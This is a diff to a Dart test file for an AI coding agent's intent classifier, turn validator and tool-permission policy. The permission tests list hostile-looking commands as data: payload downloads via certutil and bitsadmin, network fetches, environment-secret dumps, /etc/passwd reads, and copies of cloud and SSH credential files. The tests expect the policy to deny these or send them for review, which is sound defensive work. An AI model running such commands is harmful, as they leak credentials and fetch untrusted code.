@@ -617,6 +617,209 @@ void main() {
         forbiddenTools: {'run_command', 'write_file', 'apply_patch_set'},
       ),
       _PromptScenario(
+        prompt:
+            'I want to build something to help me size out datacenters for customers',
+        mode: StudioPromptMode.code,
+        expectedIntent: TurnIntent.ask,
+        expectedToolMode: AgentToolMode.ask,
+        mayCreateWorkspace: false,
+        requiredTools: {'read_file', 'search_files'},
+        forbiddenTools: {'propose_patch', 'run_command', 'write_file'},
+      ),
+      _PromptScenario(
+        prompt: 'build me a CRM',
+        mode: StudioPromptMode.code,
+        expectedIntent: TurnIntent.ask,
+        expectedToolMode: AgentToolMode.ask,
+        mayCreateWorkspace: false,
+        requiredTools: {'read_file', 'search_files'},
+        forbiddenTools: {'propose_patch', 'run_command', 'write_file'},
+      ),
+      _PromptScenario(
+        prompt: 'create a website for my bakery',
+        mode: StudioPromptMode.code,
+        expectedIntent: TurnIntent.ask,
+        expectedToolMode: AgentToolMode.ask,
+        mayCreateWorkspace: false,
+        requiredTools: {'read_file', 'search_files'},
+        forbiddenTools: {'propose_patch', 'run_command', 'write_file'},
+      ),
+      _PromptScenario(
+        prompt: 'prototype a dashboard to track customer renewals',
+        mode: StudioPromptMode.code,
+        expectedIntent: TurnIntent.ask,
+        expectedToolMode: AgentToolMode.ask,
+        mayCreateWorkspace: false,
+        requiredTools: {'read_file', 'search_files'},
+        forbiddenTools: {'propose_patch', 'run_command', 'write_file'},
+      ),
+      _PromptScenario(
+        prompt: 'help me build an internal tool for quote approvals',
+        mode: StudioPromptMode.fix,
+        expectedIntent: TurnIntent.ask,
+        expectedToolMode: AgentToolMode.ask,
+        mayCreateWorkspace: false,
+        requiredTools: {'read_file', 'search_files'},
+        forbiddenTools: {'propose_patch', 'run_command', 'write_file'},
+      ),
+      _PromptScenario(
+        prompt: 'I need a portal for customers to manage support requests',
+        mode: StudioPromptMode.code,
+        expectedIntent: TurnIntent.ask,
+        expectedToolMode: AgentToolMode.ask,
+        mayCreateWorkspace: false,
+        requiredTools: {'read_file', 'search_files'},
+        forbiddenTools: {'propose_patch', 'run_command', 'write_file'},
+      ),
+      _PromptScenario(
+        prompt:
+            'can you help me with a new dashboard for sales pipeline reviews',
+        mode: StudioPromptMode.fix,
+        expectedIntent: TurnIntent.ask,
+        expectedToolMode: AgentToolMode.ask,
+        mayCreateWorkspace: false,
+        requiredTools: {'read_file', 'search_files'},
+        forbiddenTools: {'propose_patch', 'run_command', 'write_file'},
+      ),
+      _PromptScenario(
+        prompt:
+            'build a project management app with tasks teams comments and notifications',
+        mode: StudioPromptMode.code,
+        expectedIntent: TurnIntent.ask,
+        expectedToolMode: AgentToolMode.ask,
+        mayCreateWorkspace: false,
+        requiredTools: {'read_file', 'search_files'},
+        forbiddenTools: {'propose_patch', 'run_command', 'write_file'},
+      ),
+      _PromptScenario(
+        prompt: 'I am thinking about a SaaS platform for customer renewals',
+        mode: StudioPromptMode.code,
+        expectedIntent: TurnIntent.ask,
+        expectedToolMode: AgentToolMode.ask,
+        mayCreateWorkspace: false,
+        requiredTools: {'read_file', 'search_files'},
+        forbiddenTools: {'propose_patch', 'run_command', 'write_file'},
+      ),
+      _PromptScenario(
+        prompt: 'we have an idea for a customer portal for support cases',
+        mode: StudioPromptMode.code,
+        expectedIntent: TurnIntent.ask,
+        expectedToolMode: AgentToolMode.ask,
+        mayCreateWorkspace: false,
+        requiredTools: {'read_file', 'search_files'},
+        forbiddenTools: {'propose_patch', 'run_command', 'write_file'},
+      ),
+      _PromptScenario(
+        prompt: 'help me scope a tool for branch network refresh planning',
+        mode: StudioPromptMode.fix,
+        expectedIntent: TurnIntent.ask,
+        expectedToolMode: AgentToolMode.ask,
+        mayCreateWorkspace: false,
+        requiredTools: {'read_file', 'search_files'},
+        forbiddenTools: {'propose_patch', 'run_command', 'write_file'},
+      ),
+      _PromptScenario(
+        prompt: 'can you help me figure out a dashboard for sales engineers',
+        mode: StudioPromptMode.code,
+        planModeEnabled: true,
+        expectedIntent: TurnIntent.ask,
+        expectedToolMode: AgentToolMode.ask,
+        mayCreateWorkspace: false,
+        requiredTools: {'read_file', 'search_files'},
+        forbiddenTools: {'propose_patch', 'run_command', 'write_file'},
+      ),
+      _PromptScenario(
+        prompt: 'build the entire app for customer datacenter sizing',
+        mode: StudioPromptMode.code,
+        expectedIntent: TurnIntent.ask,
+        expectedToolMode: AgentToolMode.ask,
+        mayCreateWorkspace: false,
+        requiredTools: {'read_file', 'search_files'},
+        forbiddenTools: {'propose_patch', 'run_command', 'write_file'},
+      ),
+      _PromptScenario(
+        prompt: 'create a customer onboarding workflow to support admins',
+        mode: StudioPromptMode.code,
+        expectedIntent: TurnIntent.ask,
+        expectedToolMode: AgentToolMode.ask,
+        mayCreateWorkspace: false,
+        requiredTools: {'read_file', 'search_files'},
+        forbiddenTools: {'propose_patch', 'run_command', 'write_file'},
+      ),
+      _PromptScenario(
+        prompt: 'I want to build an app to manage customer sizing requests',
+        mode: StudioPromptMode.code,
+        planModeEnabled: true,
+        expectedIntent: TurnIntent.ask,
+        expectedToolMode: AgentToolMode.ask,
+        mayCreateWorkspace: false,
+        requiredTools: {'read_file', 'search_files'},
+        forbiddenTools: {'propose_patch', 'run_command', 'write_file'},
+      ),
+      _PromptScenario(
+        prompt: 'I want to build a React app to size datacenters',
+        mode: StudioPromptMode.code,
+        expectedIntent: TurnIntent.ask,
+        expectedToolMode: AgentToolMode.ask,
+        mayCreateWorkspace: false,
+        requiredTools: {'read_file', 'search_files'},
+        forbiddenTools: {'propose_patch', 'run_command', 'write_file'},
+      ),
+      _PromptScenario(
+        prompt: 'build a Next.js SaaS platform for renewal forecasting',
+        mode: StudioPromptMode.code,
+        expectedIntent: TurnIntent.ask,
+        expectedToolMode: AgentToolMode.ask,
+        mayCreateWorkspace: false,
+        requiredTools: {'read_file', 'search_files'},
+        forbiddenTools: {'propose_patch', 'run_command', 'write_file'},
+      ),
+      _PromptScenario(
+        prompt: 'create a Python tool for network migration planning',
+        mode: StudioPromptMode.fix,
+        expectedIntent: TurnIntent.ask,
+        expectedToolMode: AgentToolMode.ask,
+        mayCreateWorkspace: false,
+        requiredTools: {'read_file', 'search_files'},
+        forbiddenTools: {'propose_patch', 'run_command', 'write_file'},
+      ),
+      _PromptScenario(
+        prompt: 'we need a Flutter dashboard for sales engineering sizing',
+        mode: StudioPromptMode.code,
+        expectedIntent: TurnIntent.ask,
+        expectedToolMode: AgentToolMode.ask,
+        mayCreateWorkspace: false,
+        requiredTools: {'read_file', 'search_files'},
+        forbiddenTools: {'propose_patch', 'run_command', 'write_file'},
+      ),
+      _PromptScenario(
+        prompt: 'build a React login page with email and password fields',
+        mode: StudioPromptMode.code,
+        expectedIntent: TurnIntent.code,
+        expectedToolMode: AgentToolMode.code,
+        mayCreateWorkspace: true,
+        requiredTools: {'read_file', 'search_files'},
+        forbiddenTools: {'run_command', 'write_file', 'apply_patch_set'},
+      ),
+      _PromptScenario(
+        prompt: 'create a Flutter settings screen with notification toggles',
+        mode: StudioPromptMode.code,
+        expectedIntent: TurnIntent.code,
+        expectedToolMode: AgentToolMode.code,
+        mayCreateWorkspace: true,
+        requiredTools: {'read_file', 'search_files'},
+        forbiddenTools: {'run_command', 'write_file', 'apply_patch_set'},
+      ),
+      _PromptScenario(
+        prompt: 'add the billing API endpoint to the existing backend',
+        mode: StudioPromptMode.fix,
+        expectedIntent: TurnIntent.code,
+        expectedToolMode: AgentToolMode.fix,
+        mayCreateWorkspace: true,
+        requiredTools: {'read_file', 'search_files'},
+        forbiddenTools: {'run_command', 'write_file', 'apply_patch_set'},
+      ),
+      _PromptScenario(
         prompt: 'write README.md content right here without saving files',
         mode: StudioPromptMode.code,
         expectedIntent: TurnIntent.ask,
@@ -1186,6 +1389,46 @@ void main() {
       expect(proposeTools, isNot(contains('run_command')));
     });
 
+    test('Studio tool phases quarantine advanced and network surfaces', () {
+      const advancedOrExternalTools = {
+        'web_fetch',
+        'web_search',
+        'github_whoami',
+        'github_list_repos',
+        'github_get_repo',
+        'github_list_issues',
+        'github_get_issue',
+        'github_create_issue',
+        'github_list_prs',
+        'github_get_pr',
+        'github_search_repos',
+        'github_search_issues',
+        'github_create_repo',
+        'orchestrate',
+      };
+
+      for (final mode in AgentToolMode.values) {
+        for (final phase in AgentToolPhase.values) {
+          final exposed = ToolRegistry.toolsForModeAndPhase(
+            mode,
+            phase,
+          ).map((tool) => tool.name).toSet();
+
+          expect(
+            exposed.intersection(advancedOrExternalTools),
+            isEmpty,
+            reason: '${mode.name}/${phase.name} exposed advanced tools.',
+          );
+          expect(
+            exposed.any((tool) => tool.startsWith('mcp_')),
+            isFalse,
+            reason:
+                '${mode.name}/${phase.name} exposed MCP tools without a runtime-compliant connector contract.',
+          );
+        }
+      }
+    });
+
     test('vague read-only prompts in Code mode do not require a workspace', () {
       final intent = IntentClassifier.classify(
         'make this better',
@@ -1621,7 +1864,27 @@ void main() {
             arguments: {'title': 'Vague', 'summary': 'Too thin', 'files': []},
           ),
         ],
-        toolResults: const [],
+        toolResults: const [
+          ToolResultEnvelope(
+            toolCallId: 'patch',
+            toolName: 'propose_patch',
+            status: ToolResultStatus.success,
+            summary: 'Patch proposal created.',
+            data: {
+              'title': 'Concrete patch',
+              'summary': 'Add route fix.',
+              'files': [
+                {
+                  'path': 'lib/router.dart',
+                  'intent': 'Fix redirect',
+                  'operation': 'modify',
+                  'before': 'void oldRedirect() {}\n',
+                  'content': 'void fixRedirect() {}\n',
+                },
+              ],
+            },
+          ),
+        ],
       );
       expect(thinPlan.status, TurnOutcomeValidationStatus.invalid);
 
@@ -1701,7 +1964,7 @@ void main() {
       );
       expect(
         unrecordedConcretePlanModePatch.userMessage,
-        contains('plan-only'),
+        contains('exactly one reviewable plan card'),
       );
 
       final concretePlanModePatch = validator.validate(
@@ -1755,6 +2018,111 @@ void main() {
       );
       expect(concretePlanModePatch.status, TurnOutcomeValidationStatus.invalid);
       expect(concretePlanModePatch.userMessage, contains('plan-only'));
+
+      final substantivePlanProseWithoutArtifact = validator.validate(
+        intent: TurnIntent.plan,
+        toolMode: AgentToolMode.plan,
+        content: '''
+Summary
+- Build a discovery plan for the customer datacenter sizing workflow.
+- Keep the first version focused on inputs, outputs, assumptions, and validation.
+
+Requirements
+- Capture customer counts, rack count, power/cooling assumptions, WAN speeds, and growth targets.
+- Identify where Cisco portfolio data, lifecycle data, and customer constraints will be sourced.
+- Define the output artifacts: sizing table, topology sketch, assumptions, and follow-up questions.
+
+Verification
+- Validate each sizing recommendation against source-backed model facts.
+- Show unknowns and confidence before any implementation starts.
+''',
+        toolCalls: const [
+          ToolCallInfo(
+            id: 'patch',
+            name: 'propose_patch',
+            arguments: {
+              'title': 'Concrete edit too early',
+              'summary':
+                  'The model attempted an edit while also drafting a plan.',
+              'files': [
+                {
+                  'path': 'docs/plan.md',
+                  'intent': 'Draft the discovery plan',
+                  'operation': 'create',
+                  'content': '# Plan\n',
+                },
+              ],
+            },
+          ),
+        ],
+        toolResults: const [
+          ToolResultEnvelope(
+            toolCallId: 'patch',
+            toolName: 'propose_patch',
+            status: ToolResultStatus.success,
+            summary: 'Patch proposal created.',
+            data: {
+              'title': 'Concrete patch',
+              'summary': 'Add route fix.',
+              'files': [
+                {
+                  'path': 'lib/router.dart',
+                  'intent': 'Fix redirect',
+                  'operation': 'modify',
+                  'before': 'void oldRedirect() {}\n',
+                  'content': 'void fixRedirect() {}\n',
+                },
+              ],
+            },
+          ),
+        ],
+      );
+      expect(
+        substantivePlanProseWithoutArtifact.status,
+        TurnOutcomeValidationStatus.invalid,
+      );
+
+      final normalizedSubstantivePlanProse = validator.validate(
+        intent: TurnIntent.plan,
+        toolMode: AgentToolMode.plan,
+        content: '''
+Summary
+- Build a discovery plan for the customer datacenter sizing workflow.
+- Keep the first version focused on inputs, outputs, assumptions, and validation.
+
+Requirements
+- Capture customer counts, rack count, power/cooling assumptions, WAN speeds, and growth targets.
+- Identify where Cisco portfolio data, lifecycle data, and customer constraints will be sourced.
+- Define the output artifacts: sizing table, topology sketch, assumptions, and follow-up questions.
+
+Verification
+- Validate each sizing recommendation against source-backed model facts.
+- Show unknowns and confidence before any implementation starts.
+''',
+        toolCalls: const [],
+        toolResults: const [
+          ToolResultEnvelope(
+            toolCallId: 'synthetic-plan',
+            toolName: 'propose_patch',
+            status: ToolResultStatus.success,
+            summary: 'Synthesized plan card.',
+            data: {
+              'title': 'Datacenter sizing workflow plan',
+              'summary': 'Create a discovery plan for datacenter sizing.',
+              'plan_markdown':
+                  'Summary\n- Build a discovery plan.\n\nAssumptions\n- Review before implementation.\n\nVerification\n- Confirm missing inputs.',
+              'assumptions': ['Review before implementation.'],
+              'verification_steps': ['Confirm missing inputs.'],
+              'files': [],
+              'synthetic_plan': true,
+            },
+          ),
+        ],
+      );
+      expect(
+        normalizedSubstantivePlanProse.status,
+        TurnOutcomeValidationStatus.valid,
+      );
 
       final planWithCommand = validator.validate(
         intent: TurnIntent.plan,
@@ -2553,11 +2921,11 @@ void main() {
       );
       expect(
         acceptedPlanWrongIntentPatch.status,
-        TurnOutcomeValidationStatus.invalid,
+        TurnOutcomeValidationStatus.valid,
       );
       expect(
-        acceptedPlanWrongIntentPatch.userMessage,
-        contains('accepted plan targets'),
+        acceptedPlanWrongIntentPatch.acceptedPlanState,
+        AcceptedPlanState.patchProposed,
       );
 
       final acceptedPlanImplicitUpdateCreatePatch = validator.validate(
@@ -2686,7 +3054,7 @@ void main() {
         AcceptedPlanState.patchProposed,
       );
 
-      final acceptedPlanPartialPatch = validator.validate(
+      final acceptedPlanFirstBatchPatch = validator.validate(
         intent: TurnIntent.code,
         toolMode: AgentToolMode.code,
         content: '',
@@ -2699,7 +3067,7 @@ void main() {
             summary: 'Patch proposal created.',
             data: {
               'title': 'Partial target patch',
-              'summary': 'This covers only one planned file.',
+              'summary': 'This covers the first planned file.',
               'files': [
                 {
                   'path': 'lib/router.dart',
@@ -2724,12 +3092,12 @@ void main() {
         ),
       );
       expect(
-        acceptedPlanPartialPatch.status,
-        TurnOutcomeValidationStatus.invalid,
+        acceptedPlanFirstBatchPatch.status,
+        TurnOutcomeValidationStatus.valid,
       );
       expect(
-        acceptedPlanPartialPatch.userMessage,
-        contains('cover every planned file'),
+        acceptedPlanFirstBatchPatch.acceptedPlanState,
+        AcceptedPlanState.patchProposed,
       );
 
       final acceptedPlanTwoPatches = validator.validate(
@@ -2909,6 +3277,7 @@ void main() {
           title: 'Plan',
           summary: 'Implement it.',
           markdown: '- Change files',
+          plannedFiles: ['lib/router.dart — Fix redirect'],
         ),
       );
       expect(duplicatePatch.status, TurnOutcomeValidationStatus.invalid);
@@ -2971,6 +3340,7 @@ void main() {
           title: 'Plan',
           summary: 'Implement it.',
           markdown: '- Change files',
+          plannedFiles: ['lib/router.dart — Fix redirect'],
         ),
       );
       expect(
@@ -3001,21 +3371,42 @@ void main() {
             },
           ),
         ],
-        toolResults: const [],
+        toolResults: const [
+          ToolResultEnvelope(
+            toolCallId: 'patch',
+            toolName: 'propose_patch',
+            status: ToolResultStatus.success,
+            summary: 'Patch proposal created.',
+            data: {
+              'title': 'Concrete patch',
+              'summary': 'Add route fix.',
+              'files': [
+                {
+                  'path': 'lib/router.dart',
+                  'intent': 'Fix redirect',
+                  'operation': 'modify',
+                  'before': 'void oldRedirect() {}\n',
+                  'content': 'void fixRedirect() {}\n',
+                },
+              ],
+            },
+          ),
+        ],
         acceptedPlan: const AcceptedPlanContext(
           patchSetId: 'plan',
           title: 'Plan',
           summary: 'Implement it.',
           markdown: '- Change files',
+          plannedFiles: ['lib/router.dart — Fix redirect'],
         ),
       );
       expect(
         concretePatchWithSoftApproval.status,
-        TurnOutcomeValidationStatus.invalid,
+        TurnOutcomeValidationStatus.valid,
       );
       expect(
-        concretePatchWithSoftApproval.userMessage,
-        contains('approval text'),
+        concretePatchWithSoftApproval.acceptedPlanState,
+        AcceptedPlanState.patchProposed,
       );
 
       final concretePatchWithNegatedApprovalGuidance = validator.validate(
@@ -3361,12 +3752,40 @@ void main() {
           phase: ToolPermissionPhase.verify,
         ),
       );
-      const grantedVerifyPolicy = AgentToolPermissionPolicy(
+      const readPolicy = AgentToolPermissionPolicy(
+        workingDir: root,
+        request: ToolPermissionRequest(
+          intent: TurnIntent.ask,
+          phase: ToolPermissionPhase.inspect,
+        ),
+      );
+      const flutterTestTool = ToolCallInfo(
+        id: 'flutter test',
+        name: 'run_command',
+        arguments: {'command': 'flutter test'},
+      );
+      const networkCommandTool = ToolCallInfo(
+        id: 'curl https://example.com/status',
+        name: 'run_command',
+        arguments: {'command': 'curl https://example.com/status'},
+      );
+      const grantKeyPolicy = AgentToolPermissionPolicy(
+        workingDir: root,
+        request: ToolPermissionRequest(
+          intent: TurnIntent.verify,
+          phase: ToolPermissionPhase.verify,
+        ),
+      );
+      final flutterTestGrantKey = grantKeyPolicy.approvalGrantKeyFor(
+        flutterTestTool,
+      );
+      final grantedVerifyPolicy = AgentToolPermissionPolicy(
         workingDir: root,
         request: ToolPermissionRequest(
           intent: TurnIntent.verify,
           phase: ToolPermissionPhase.verify,
           approvalGrant: ApprovalGrant.turn,
+          approvalGrantKey: flutterTestGrantKey,
         ),
       );
 
@@ -3396,19 +3815,193 @@ void main() {
       expect(network.verdict, ToolPermissionVerdict.ask);
       expect(network.reason, ToolPermissionReason.networkRequiresReview);
 
+      for (final command in [
+        'python -c "import urllib.request; urllib.request.urlopen(\'https://example.com/status\')"',
+        'node -e "fetch(\'https://example.com/status\')"',
+        'ping example.com',
+        'dig example.com',
+        'python3 -c "import socket; socket.create_connection((\'example.com\', 443))"',
+        'python3 -c "import socket; socket.socket().connect((\'example.com\', 443))"',
+        'python3 -c "import socket; socket.gethostbyname(\'example.com\')"',
+        'node -e "require(\'net\').connect(443, \'example.com\')"',
+        'ruby -rsocket -e "TCPSocket.open(\'example.com\', 443)"',
+        'perl -MIO::Socket::INET -e "IO::Socket::INET->new(PeerHost=>\'example.com\', PeerPort=>443)"',
+        'echo https://example.com/status',
+      ]) {
+        final decision = decide(verifyPolicy, command);
+        expect(decision.verdict, ToolPermissionVerdict.ask, reason: command);
+        expect(
+          decision.reason,
+          ToolPermissionReason.networkRequiresReview,
+          reason: command,
+        );
+      }
+
+      for (final command in [
+        'python -c "import os; print(os.environ)"',
+        'python -c "import os; print(os.getenv(\'CIRCUIT_TOKEN\'))"',
+        'node -e "console.log(process.env)"',
+      ]) {
+        final decision = decide(verifyPolicy, command);
+        expect(decision.verdict, ToolPermissionVerdict.deny, reason: command);
+        expect(
+          decision.reason,
+          ToolPermissionReason.secretPath,
+          reason: command,
+        );
+      }
+
+      for (final command in [
+        'cat ../outside.txt',
+        'git diff ../outside.txt README.md',
+        'git diff --no-index /etc/passwd README.md',
+        'python -c "open(\'../outside.txt\').read()"',
+        'node -e "require(\'fs\').readFileSync(\'/etc/passwd\')"',
+      ]) {
+        final decision = decide(verifyPolicy, command);
+        expect(decision.verdict, ToolPermissionVerdict.deny, reason: command);
+        expect(
+          decision.reason,
+          ToolPermissionReason.pathOutsideWorkspace,
+          reason: command,
+        );
+      }
+
+      final insideWorkspaceAbsolutePath = decide(
+        verifyPolicy,
+        'cat /tmp/circuit-engine-eval/README.md',
+      );
+      expect(insideWorkspaceAbsolutePath.verdict, ToolPermissionVerdict.ask);
+      expect(
+        insideWorkspaceAbsolutePath.reason,
+        ToolPermissionReason.commandRequiresReview,
+      );
+
       final githubNetwork = verifyPolicy.evaluate(
         const ToolCallInfo(id: 'gh', name: 'github_list_repos'),
       );
       expect(githubNetwork.verdict, ToolPermissionVerdict.ask);
       expect(githubNetwork.reason, ToolPermissionReason.networkRequiresReview);
 
+      final githubMutation = verifyPolicy.evaluate(
+        const ToolCallInfo(id: 'gh-create', name: 'github_create_issue'),
+      );
+      expect(githubMutation.verdict, ToolPermissionVerdict.deny);
+      expect(
+        githubMutation.message,
+        contains('GitHub mutation is not available in Studio turns'),
+      );
+
+      final githubMutationGrantKey = verifyPolicy.approvalGrantKeyFor(
+        const ToolCallInfo(id: 'gh-create', name: 'github_create_issue'),
+      );
+      final grantedGithubMutationPolicy = AgentToolPermissionPolicy(
+        workingDir: root,
+        request: ToolPermissionRequest(
+          intent: TurnIntent.verify,
+          phase: ToolPermissionPhase.verify,
+          approvalGrant: ApprovalGrant.turn,
+          approvalGrantKey: githubMutationGrantKey,
+        ),
+      );
+      expect(
+        grantedGithubMutationPolicy
+            .evaluate(
+              const ToolCallInfo(id: 'gh-create', name: 'github_create_issue'),
+            )
+            .verdict,
+        ToolPermissionVerdict.deny,
+      );
+
+      final mcpReadOnly = readPolicy.evaluate(
+        const ToolCallInfo(id: 'mcp-read', name: 'mcp_list_records'),
+      );
+      expect(mcpReadOnly.verdict, ToolPermissionVerdict.allow);
+      expect(mcpReadOnly.reason, ToolPermissionReason.readOnlyInsideWorkspace);
+
+      const mcpUnknownTool = ToolCallInfo(
+        id: 'mcp-unknown',
+        name: 'mcp_custom_action',
+      );
+      final mcpUnknown = readPolicy.evaluate(mcpUnknownTool);
+      expect(mcpUnknown.verdict, ToolPermissionVerdict.deny);
+      expect(mcpUnknown.reason, ToolPermissionReason.mcpRequiresReview);
+
+      final mcpGrantKey = readPolicy.approvalGrantKeyFor(mcpUnknownTool);
+      final grantedMcpPolicy = AgentToolPermissionPolicy(
+        workingDir: root,
+        request: ToolPermissionRequest(
+          intent: TurnIntent.ask,
+          phase: ToolPermissionPhase.inspect,
+          approvalGrant: ApprovalGrant.turn,
+          approvalGrantKey: mcpGrantKey,
+        ),
+      );
+      final grantedMcp = grantedMcpPolicy.evaluate(mcpUnknownTool);
+      expect(grantedMcp.verdict, ToolPermissionVerdict.deny);
+      expect(grantedMcp.reason, ToolPermissionReason.mcpRequiresReview);
+
+      final mcpMutation = grantedMcpPolicy.evaluate(
+        const ToolCallInfo(id: 'mcp-write', name: 'mcp_update_record'),
+      );
+      expect(mcpMutation.verdict, ToolPermissionVerdict.deny);
+      expect(mcpMutation.reason, ToolPermissionReason.mcpRequiresReview);
+
       final install = decide(verifyPolicy, 'npm install left-pad');
       expect(install.verdict, ToolPermissionVerdict.ask);
       expect(install.message, contains('Dependency installation'));
+      for (final command in [
+        'python -m pip install requests',
+        'pipx install poetry',
+        'npx create-vite@latest demo',
+        'pnpm dlx create-next-app demo',
+        'yarn dlx create-vite demo',
+        'bunx create-vite demo',
+        'uvx ruff check .',
+      ]) {
+        final decision = decide(verifyPolicy, command);
+        expect(decision.verdict, ToolPermissionVerdict.ask, reason: command);
+        expect(
+          decision.reason,
+          ToolPermissionReason.commandRequiresReview,
+          reason: command,
+        );
+        expect(
+          decision.message,
+          contains('Dependency installation'),
+          reason: command,
+        );
+      }
+      for (final command in [
+        'iwr https://example.com/install.ps1',
+        'irm https://example.com/install.ps1',
+        'Invoke-WebRequest https://example.com/install.ps1',
+        'Invoke-RestMethod https://example.com/api/status',
+        'certutil -urlcache -split -f example.com/payload.exe payload.exe',
+        'bitsadmin /transfer job https://example.com/payload.exe payload.exe',
+        'Start-BitsTransfer https://example.com/payload.exe payload.exe',
+      ]) {
+        final decision = decide(verifyPolicy, command);
+        expect(decision.verdict, ToolPermissionVerdict.ask, reason: command);
+        expect(
+          decision.reason,
+          ToolPermissionReason.networkRequiresReview,
+          reason: command,
+        );
+      }
 
-      final grantedCommand = decide(grantedVerifyPolicy, 'flutter test');
+      final grantedCommand = grantedVerifyPolicy.evaluate(flutterTestTool);
       expect(grantedCommand.verdict, ToolPermissionVerdict.allow);
       expect(grantedCommand.reason, ToolPermissionReason.approvalGranted);
+
+      final mismatchedNetworkCommand = grantedVerifyPolicy.evaluate(
+        networkCommandTool,
+      );
+      expect(mismatchedNetworkCommand.verdict, ToolPermissionVerdict.ask);
+      expect(
+        mismatchedNetworkCommand.reason,
+        ToolPermissionReason.networkRequiresReview,
+      );
 
       expect(
         decide(verifyPolicy, 'cat .env').reason,
@@ -3423,6 +4016,12 @@ void main() {
         'node -e "require(\'fs\').readFileSync(\'.npmrc\', \'utf8\')"',
         'tar czf secrets.tgz .aws/credentials',
         'cp ~/.netrc /tmp/netrc-copy',
+        'cat ~/.config/gh/hosts.yml',
+        'cat ~/.kube/config',
+        'cat ~/.docker/config.json',
+        'cp ~/.azure/accessTokens.json /tmp/azure-token-copy',
+        'tar czf gcloud.tgz ~/.config/gcloud',
+        'node -e "require(\'fs\').readFileSync(\'.ssh/config\', \'utf8\')"',
         'source .env',
         'cat ~/.aws/credentials',
       ]) {
